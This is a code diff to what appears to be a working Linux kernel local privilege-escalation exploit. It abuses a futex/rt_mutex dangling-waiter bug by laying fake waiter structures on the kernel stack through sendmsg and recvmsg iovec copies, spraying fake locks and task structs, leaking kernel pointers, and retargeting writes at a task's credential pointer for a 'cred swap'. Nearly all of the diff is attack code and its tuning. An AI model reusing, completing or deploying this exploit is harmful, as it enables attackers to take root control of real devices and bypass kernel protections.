@@ -8,7 +8,7 @@ static double fops_elapsed_ms(struct timespec *ref) {
 }
 extern int pselect_custom_write;
 
-#define PSELECT_CFI_ROUTE_ATTEMPTS 8
+#define PSELECT_CFI_ROUTE_ATTEMPTS 14
 #define PSELECT_EXPECTED_READY 9
 
 atomic_int cfi_stage_done;
@@ -47,7 +47,7 @@ static int route_delay_usec(int attempt) {
   /* With the write-plan engine active the consumer needs some head start
    * delay so the overlay sendmsg has landed on the waiter's kernel stack
    * before the first sched_setattr fires. */
-  int default_delay = pselect_custom_write_enabled() ? 50000 : -1;
+  int default_delay = pselect_custom_write_enabled() ? 1000 : -1;
   int override = env_int_range("PSELECT_ROUTE_DELAY_USEC",
                                default_delay, -1, 1000000);
   if (override >= 0) {
@@ -117,10 +117,10 @@ void ghost_apply_next_plan(int completed_walks) {
    * can make syscalls post-walk, unlike the main thread). Override the
    * plan's target if the consumer leaked its own task. */
   if (write_mode_is_cred(pselect_custom_write) && g_consumer_task) {
-    pc = (g_consumer_task + TASK15_CRED_OFF - 8) | 1;
+    pc = (g_consumer_task + TASK_CRED_OFF - 8) | 1;
     char m[96];
     int n = snprintf(m, sizeof(m), "[PLAN] retarget walk 1 -> consumer cred %016lx\n",
-                     (unsigned long)(g_consumer_task + TASK15_CRED_OFF));
+                     (unsigned long)(g_consumer_task + TASK_CRED_OFF));
     write(1, m, n);
   }
   for (int m = 0; m < uring_count && m < URING_MAX; m++) {
@@ -323,35 +323,46 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  * kernel's linear page at the leaked mm address is NOT any of our
  * mappings (the reclaim lost the page). */
 static atomic_int g_poller_stop;
+static atomic_int g_poller_active;
 static pthread_t g_poller_tid;
 
+/* Samples lock->wait_lock and W0.pi_tree.pc in EVERY payload block of every
+ * mapping (the mm page can be a non-zero block of any ring, and the walk's
+ * [5] trylock sets wait_lock transiently). A block-level lock-word change is
+ * proof the kernel walked OUR lock (overlay landed + reached [5]). */
+#define POLL_MAX_BLOCKS 8192
 static void *walk_poller(void *arg __attribute__((unused))) {
-  static uint64_t last_lock[64];
-  static uint64_t last_pc[64];
-  int n = uring_count;
-  if (n > 64) n = 64;
-  for (int m = 0; m < n; m++) {
-    last_lock[m] = *(volatile uint64_t *)((uint8_t *)uring_maps[m] + LOCK_OFF);
-    last_pc[m] = *(volatile uint64_t *)((uint8_t *)uring_maps[m] + W0_OFF + 0x18);
+  static uint64_t last_lock[POLL_MAX_BLOCKS];
+  static uint64_t last_pc[POLL_MAX_BLOCKS];
+  int n = 0;
+  for (int bi = 0; n < POLL_MAX_BLOCKS; bi++) {
+    uint8_t *pg = uring_block(bi);
+    if (!pg) break;
+    last_lock[n] = *(volatile uint64_t *)(pg + LOCK_OFF);
+    last_pc[n] = *(volatile uint64_t *)(pg + W0_OFF + 0x18);
+    n++;
   }
   while (!atomic_load(&g_poller_stop)) {
-    for (int m = 0; m < n; m++) {
-      volatile uint8_t *pg = (volatile uint8_t *)uring_maps[m];
+    int i = 0;
+    for (int bi = 0; i < n; bi++, i++) {
+      uint8_t *pg = uring_block(bi);
+      if (!pg) break;
       uint64_t l = *(volatile uint64_t *)(pg + LOCK_OFF);
-      if (l != last_lock[m]) {
-        pr_info("[POLL] ring %d lock word +0x%X: %016llx -> %016llx\n",
-                m, LOCK_OFF, (unsigned long long)last_lock[m], (unsigned long long)l);
-        last_lock[m] = l;
+      if (l != last_lock[i]) {
+        pr_info("[POLL] block %d lock word +0x%X: %016llx -> %016llx\n",
+                bi, LOCK_OFF, (unsigned long long)last_lock[i],
+                (unsigned long long)l);
+        last_lock[i] = l;
       }
       uint64_t pc = *(volatile uint64_t *)(pg + W0_OFF + 0x18);
-      if (pc != last_pc[m]) {
-        pr_info("[POLL] ring %d W0.pi_tree.pc +0x%04zx: %016llx -> %016llx\n",
-                m, (size_t)W0_OFF + 0x18,
-                (unsigned long long)last_pc[m], (unsigned long long)pc);
-        last_pc[m] = pc;
+      if (pc != last_pc[i]) {
+        pr_info("[POLL] block %d W0.pi_tree.pc +0x%04zx: %016llx -> %016llx\n",
+                bi, (size_t)W0_OFF + 0x18,
+                (unsigned long long)last_pc[i], (unsigned long long)pc);
+        last_pc[i] = pc;
       }
     }
-    for (volatile int i = 0; i < 200; i++)
+    for (volatile int k = 0; k < 200; k++)
       ;
   }
   return NULL;
@@ -359,18 +370,24 @@ static void *walk_poller(void *arg __attribute__((unused))) {
 
 static void walk_poller_start(void) {
   if (!env_flag("WALK_POLL", 0) || uring_count == 0) return;
-  /* No pthread_create from the SIGUSR1 handler context (the in-handler
-   * route may call this). */
-  if (atomic_load(&route_in_handler)) return;
+  /* The coffey route ALWAYS runs inside the SIGUSR1 handler, so the old
+   * route_in_handler bail-out made WALK_POLL a no-op there. pthread_create
+   * from a handler is not strictly async-signal-safe, but this is a
+   * one-shot diagnostic that only reads the mappings. */
+  if (atomic_load(&g_poller_active)) return;
   atomic_store(&g_poller_stop, 0);
-  if (pthread_create(&g_poller_tid, NULL, walk_poller, NULL) == 0)
+  if (pthread_create(&g_poller_tid, NULL, walk_poller, NULL) == 0) {
+    atomic_store(&g_poller_active, 1);
     pr_info("[POLL] walk poller started (%d mappings)\n", uring_count);
+  }
 }
 
 static void walk_poller_stop(void) {
   if (!env_flag("WALK_POLL", 0) || uring_count == 0) return;
+  if (!atomic_load(&g_poller_active)) return;
   atomic_store(&g_poller_stop, 1);
   pthread_join(g_poller_tid, NULL);
+  atomic_store(&g_poller_active, 0);
   pr_info("[POLL] walk poller stopped\n");
 }
 
@@ -482,9 +499,12 @@ void ghost_usr1_handler(int sig) {
   }
   atomic_store(&route_in_handler, 1);
   {
-    static const char go[] =
-        "[TRIG] waiter SIGUSR1 handler: overlay route start (futex pending restart)\n";
-    write(1, go, sizeof(go) - 1);
+    char go[160];
+    int n = snprintf(go, sizeof(go),
+        "[TRIG] SIGUSR1 handler: overlay route start (futex pending restart) "
+        "hdl_tid=%d waiter_tid=%d\n",
+        (int)syscall(SYS_gettid), atomic_load(&waiter_tid));
+    write(1, go, n);
   }
   do_pselect_fake_lock_route();
   /* On return: the walks fired against the overlay and the page is
@@ -522,11 +542,17 @@ void do_pselect_fake_lock_route(void) {
        * change, so the pending plan's erase fires on the SAME page. No
        * re-spray: the page is verified live; re-spraying would only
        * re-roll the reclaim dice. */
-      int retry_same_page =
-          write_mode_is_cred(pselect_custom_write) && page_base &&
-          atomic_load(&consumer_erase_hits) > 0 &&
-          atomic_load(&consumer_erase_hits) < g_write_plan_count &&
-          consumer_nice_headroom();
+      /* Also reuse the captured page while self-scanning OVL_SHIFT: the
+       * overlay lives on the KERNEL STACK, so changing its base needs no
+       * re-spray - only a fresh sendmsg. Re-spraying 13x would cost ~2min. */
+      int ovl_scan = active_offsets && active_offsets->iov_covers_waiter &&
+                     env_flag("OVL_SCAN", 0) && !getenv("OVL_SHIFT") &&
+                     !g_route_write_ok && page_base;
+      int retry_same_page = ovl_scan ||
+          (write_mode_is_cred(pselect_custom_write) && page_base &&
+           atomic_load(&consumer_erase_hits) > 0 &&
+           atomic_load(&consumer_erase_hits) < g_write_plan_count &&
+           consumer_nice_headroom());
       if (!retry_same_page) {
         page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
         if (!page_base || !fake_lock || !fake_fops) {
@@ -652,11 +678,58 @@ void do_pselect_fake_lock_route(void) {
      * pi_tree_entry = {pc=0, right=0, left=0}: only erased if a later walk
      * has prerequeue_top_waiter == the stack waiter; with pc=0 that erase
      * writes NULL to fake_task->pi_waiters.rb_node (harmless). */
-    siov[5].iov_len = 0;
-    siov[6].iov_base = NULL;
-    siov[6].iov_len = 0;
-    siov[7].iov_base = NULL;
-    siov[7].iov_len = 0;
+    /* iov_covers_waiter (coffey): the sendmsg iovstack is at waiter-0x28, so
+     * the 128-byte iovec copy covers waiter+0x00..0x58 entirely. The iovecs
+     * therefore carry the *pointers* (task@0x30 -> iov[5].iov_len,
+     * lock@0x38 -> iov[6].iov_base). Those kernel addresses make the later
+     * access_ok() checks fail, so sendmsg returns early -- but import_iovec's
+     * copy_from_user(iovstack, ...) runs BEFORE that validation, so the
+     * overlay still lands. The SIGUSR1 route then stays in its userspace
+     * spin-wait (only shallow clock_gettime syscalls) so the kernel stack
+     * region is not reused until the consumer's walks complete. */
+    int coffey_iov = active_offsets && active_offsets->iov_covers_waiter;
+    if (coffey_iov) {
+      /* Build the 128-byte iovec-array image directly. The iovstack copy is
+       * at waiter-0x28, so waiter field W must appear at raw[0x28+W] (raw[j]
+       * lands at waiter + j - 0x28). OVL_SHIFT (in qwords) tunes the
+       * alignment if the frame delta differs on this build. */
+      /* Self-scanning overlay alignment: each route attempt tries the next
+       * OVL_SHIFT value (qwords) so a single --selftest run sweeps them. Set
+       * OVL_SHIFT=<n> in the env to force one value (stops the scan). */
+      static const int ovl_shifts[] = {0, 1, -1, 2, -2, 3, -3, 4, -4, 5, -5, 6, -6};
+      int nsh = (int)(sizeof(ovl_shifts) / sizeof(ovl_shifts[0]));
+      char *eshift = getenv("OVL_SHIFT");
+      /* coffey: base 0x28 is correct (iovstack = waiter-0x28); the original
+       * failure was the handler's clock_gettime spin clobbering the overlay,
+       * not the frame delta. Only scan if OVL_SCAN=1 explicitly. */
+      int shift_q = eshift ? (int)strtol(eshift, NULL, 0)
+                   : (env_flag("OVL_SCAN", 0)
+                          ? ovl_shifts[(route_attempt - 1) % nsh] : 0);
+      (void)nsh;
+      int base = 0x28 - shift_q * 8;
+      uint8_t raw[128];
+      memset(raw, 0, sizeof(raw));
+      uint32_t ws_v = 3;
+      int32_t pr_v = prio;
+      struct { int off; int sz; const void *p; } flds[] = {
+        {0x30, 8, &task_val}, {0x38, 8, &lock_val},
+        {0x40, 4, &ws_v},     {0x44, 4, &pr_v},
+      };
+      for (size_t fi = 0; fi < sizeof(flds) / sizeof(flds[0]); fi++) {
+        int pos = base + flds[fi].off;
+        if (pos >= 0 && pos + flds[fi].sz <= 128)
+          memcpy(raw + pos, flds[fi].p, flds[fi].sz);
+      }
+      memcpy(siov, raw, sizeof(raw));
+      pr_info("iovstack overlay (coffey): OVL_SHIFT=%d base=0x%x task@0x%x lock@0x%x\n",
+              shift_q, base, base + 0x30, base + 0x38);
+    } else {
+      siov[5].iov_len = 0;
+      siov[6].iov_base = NULL;
+      siov[6].iov_len = 0;
+      siov[7].iov_base = NULL;
+      siov[7].iov_len = 0;
+    }
 
     uint64_t write_target = pselect_custom_target;
 
@@ -666,6 +739,16 @@ void do_pselect_fake_lock_route(void) {
     smsg.msg_namelen = 128;
     smsg.msg_iov = siov;
     smsg.msg_iovlen = 8;
+    /* coffey: lay BOTH overlays in one sendmsg.
+     *  - the SEQPACKET sockaddr (move_addr_to_kernel -> ___sys_sendmsg's
+     *    `address` at T-0x178) with the sabrina layout maps onto a waiter at
+     *    sockaddr+0x28 = T-0x1a0;
+     *  - the iovec array (iovstack at T-0x1f8, built below) maps onto a
+     *    waiter at T-0x1d0.
+     * The port previously dropped the sockaddr and bet on the iovstack only;
+     * CAL_LOCK=0 proved the iovstack alone does not land, so keep both and
+     * let whichever matches the real dangling rt_waiter take effect. */
+    if (coffey_iov) { smsg.msg_name = &overlay_addr; smsg.msg_namelen = 128; }
 
     /* Fill sender wmem so overlay sendmsg blocks */
     int sndbuf = 4096;
@@ -729,10 +812,10 @@ void do_pselect_fake_lock_route(void) {
               *(uint32_t *)(page + W0_OFF + 0x40),
               *(uint32_t *)(page + W0_OFF + 0x44));
       pr_info("    task.pi: waiters.root=%016llx left=%016llx pi_top=%016llx blocked=%016llx\n",
-              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x8F8),
-              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x900),
-              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x908),
-              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + 0x910));
+              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF),
+              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8),
+              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF),
+              (unsigned long long)*(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF));
       pr_info("    task.prio/normal: prio=%08x normal=%08x usage=%08x cpu=%08x\n",
               *(uint32_t *)(page + FAKE_TASK_OFF + 0x7C),
               *(uint32_t *)(page + FAKE_TASK_OFF + 0x84),
@@ -752,10 +835,48 @@ void do_pselect_fake_lock_route(void) {
             (unsigned long long)write_target, g_write_plan_count,
             fops_elapsed_ms(&route_t0));
 
-    atomic_store(&punch_consume_go, route_attempt);
+    /* Probe: does a plain, VALID sendmsg reach the kernel at all (or is the
+     * syscall filtered, e.g. by seccomp, so the overlay never gets copied)?
+     * A 0-byte valid sendmsg on a connected SEQPACKET pair returns 0. */
+    {
+      int rp[2];
+      if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, rp) == 0) {
+        char c = 0;
+        struct iovec iv = { .iov_base = &c, .iov_len = 0 };
+        struct msghdr mv;
+        memset(&mv, 0, sizeof(mv));
+        mv.msg_iov = &iv;
+        mv.msg_iovlen = 1;
+        errno = 0;
+        ssize_t vr = sendmsg(rp[0], &mv, MSG_DONTWAIT);
+        pr_info("[SNDPROBE] valid sendmsg ret=%zd errno=%d\n", vr, errno);
+        close(rp[0]);
+        close(rp[1]);
+      } else {
+        pr_info("[SNDPROBE] socketpair errno=%d\n", errno);
+      }
+    }
+
+    /* Second overlay window: recvmsg's ___sys_recvmsg lays its OWN iovstack
+     * at a DIFFERENT frame offset than sendmsg's ___sys_sendmsg. Laying the
+     * same image via recvmsg covers a second kernel-stack window for free. */
+    if (coffey_iov) {
+      struct msghdr rmsg;
+      memset(&rmsg, 0, sizeof(rmsg));
+      rmsg.msg_iov = siov;
+      rmsg.msg_iovlen = 8;
+      errno = 0;
+      ssize_t rret = recvmsg(seqsv[1], &rmsg, MSG_DONTWAIT);
+      pr_info("[RCVPROBE] overlay recvmsg ret=%zd errno=%d\n", rret, errno);
+    }
+
+    if (!coffey_iov) atomic_store(&punch_consume_go, route_attempt);
     errno = 0;
     ssize_t sret = sendmsg(seqsv[0], &smsg, 0);
     int saved_errno = errno;
+    /* coffey: the sendmsg fails (access_ok on the pointer iovecs) but the
+     * iovstack overlay already landed; release the consumer's walks now. */
+    if (coffey_iov) atomic_store(&punch_consume_go, route_attempt);
 
     /* Spin-wait until the consumer finished ALL plan walks (max 8s).
      * The consumer clears punch_consume_go only after the LAST walk's
@@ -766,12 +887,15 @@ void do_pselect_fake_lock_route(void) {
      * overlay sockets (or unwinding the blocked sendmsg) while a walk is
      * still mid-flight lets the waiter thread reuse its kernel stack and
      * corrupts the overlay data the walk is dereferencing. */
-    struct timespec spin_start;
-    clock_gettime(CLOCK_MONOTONIC, &spin_start);
-    while (atomic_load(&punch_consume_go) != 0) {
-      struct timespec spin_now;
-      clock_gettime(CLOCK_MONOTONIC, &spin_now);
-      if (spin_now.tv_sec - spin_start.tv_sec >= 8) break;
+    /* PURE user-space spin: no syscalls between the overlay sendmsg and the
+     * consumer's walk. With CONFIG_INIT_STACK_ALL_ZERO a deep clock_gettime
+     * frame could otherwise zero/corrupt the T-0x1d0 waiter region. */
+    {
+      volatile unsigned long spins = 0;
+      while (atomic_load(&punch_consume_go) != 0) {
+        __asm__ volatile("yield" ::: "memory");
+        if (++spins > 4000000000UL) break;
+      }
     }
 
     /* Extra settle: make sure the final walk is fully unwound. */
@@ -906,9 +1030,9 @@ void do_pselect_fake_lock_route(void) {
       pr_info("  lock: wait_lock=%08x waiters.root=%016llx left=%016llx owner=%016llx\n",
               wl, (unsigned long long)waiters_root, (unsigned long long)waiters_left,
               (unsigned long long)owner);
-      uint64_t pi_root = *(uint64_t *)(page + FAKE_TASK_OFF + 0x8F8);
-      uint64_t pi_left = *(uint64_t *)(page + FAKE_TASK_OFF + 0x900);
-      uint64_t pi_blocked = *(uint64_t *)(page + FAKE_TASK_OFF + 0x910);
+      uint64_t pi_root = *(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF);
+      uint64_t pi_left = *(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8);
+      uint64_t pi_blocked = *(uint64_t *)(page + FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF);
       pr_info("  task: pi_waiters.root=%016llx left=%016llx pi_blocked=%016llx\n",
               (unsigned long long)pi_root, (unsigned long long)pi_left,
               (unsigned long long)pi_blocked);
@@ -933,15 +1057,18 @@ void do_pselect_fake_lock_route(void) {
       if (!walk_ran) {
         pr_warning("  walk did NOT run (no page shows rb_leftmost change)\n");
       }
-      if (walk_ran && pselect_custom_write == 5 &&
+      if (pselect_custom_write == 5 &&
           pselect_custom_target == page_base + SELFTEST_OFF) {
+        /* Print unconditionally: if the write landed but the [7] readback
+         * missed the page, this still shows the target value. */
         uint64_t st = *(uint64_t *)(page + SELFTEST_OFF);
-        g_route_write_ok = (st == (uint64_t)(page_base + SELFTEST_VALUE));
+        int ok = walk_ran && st == (uint64_t)(page_base + SELFTEST_VALUE);
+        if (walk_ran) g_route_write_ok = ok;
         pr_info("  selftest: *(page+0x%X)=%016llx want=%016llx => WRITE %s\n",
                 SELFTEST_OFF,
                 (unsigned long long)st,
                 (unsigned long long)(page_base + SELFTEST_VALUE),
-                g_route_write_ok ? "VERIFIED" : "FAILED");
+                ok ? "VERIFIED" : "FAILED");
       } else if (walk_ran && write_mode_is_cred(pselect_custom_write)) {
         g_route_write_ok = atomic_load(&consumer_erase_hits) >= g_write_plan_count;
         pr_info("  cred swap: erases %d/%d (walks ran: %d) => cred pointer writes %s\n",
@@ -961,6 +1088,43 @@ void do_pselect_fake_lock_route(void) {
           }
         }
         pr_info("  total new kernel pointers: %d\n", kptrs);
+      }
+      /* ---- stack-waiter hunt ----
+       * [7] rt_mutex_enqueue(&stack_waiter.tree_entry, ...) writes the
+       * WAITER THREAD's kernel-stack address into fake_lock->waiters
+       * (rb_node/rb_leftmost). A vmap'd kernel stack lives at >=
+       * 0xffffffc000000000, unlike the linear-map spray page (0xffffff80...).
+       * If the overlay landed AND the walk reached [7], that address shows
+       * up in one of our mappings even when the readback picked the wrong
+       * block. Runs regardless of walk_ran so we can separate "overlay
+       * never landed" from "landed but exited before [7]". */
+      if (env_flag("STACK_HUNT", 1)) {
+        int found = 0;
+        for (int bi = 0; found < 16; bi++) {
+          uint8_t *pg = uring_block(bi);
+          if (!pg) break;
+          for (size_t off = 0; off + 8 <= MM_SLAB_SIZE && found < 16; off += 8) {
+            uint64_t v = *(uint64_t *)(pg + off);
+            if (v >= 0xffffffc000000000ULL) {
+              pr_info("[STACKHUNT] uring block %d +%04zx = %016llx\n",
+                      bi, off, (unsigned long long)v);
+              found++;
+            }
+          }
+        }
+        int nskb = skb_readback_count();
+        for (int s = 0; s < nskb && found < 16; s++) {
+          uint8_t *pg = skb_readback_buf(s);
+          for (size_t off = 0; off + 8 <= MM_SLAB_SIZE && found < 16; off += 8) {
+            uint64_t v = *(uint64_t *)(pg + off);
+            if (v >= 0xffffffc000000000ULL) {
+              pr_info("[STACKHUNT] skb %d +%04zx = %016llx\n",
+                      s, off, (unsigned long long)v);
+              found++;
+            }
+          }
+        }
+        pr_info("[STACKHUNT] stack-range pointers: %d\n", found);
       }
     }
 
@@ -1004,6 +1168,14 @@ void do_pselect_fake_lock_route(void) {
 
     readback_full_diff();
     walk_poller_stop();
+
+    /* coffey overlay self-scan: keep sweeping OVL_SHIFT until the walk
+     * fires (g_route_write_ok set) or we run out of attempts. */
+    if (coffey_iov && env_flag("OVL_SCAN", 0) && !getenv("OVL_SHIFT") &&
+        !g_route_write_ok && route_attempt < PSELECT_CFI_ROUTE_ATTEMPTS) {
+      route_verified = 0;
+      continue;
+    }
 
     if (route_verified || cfi_dirty_seen || cfi_last_step != 1) break;
   }
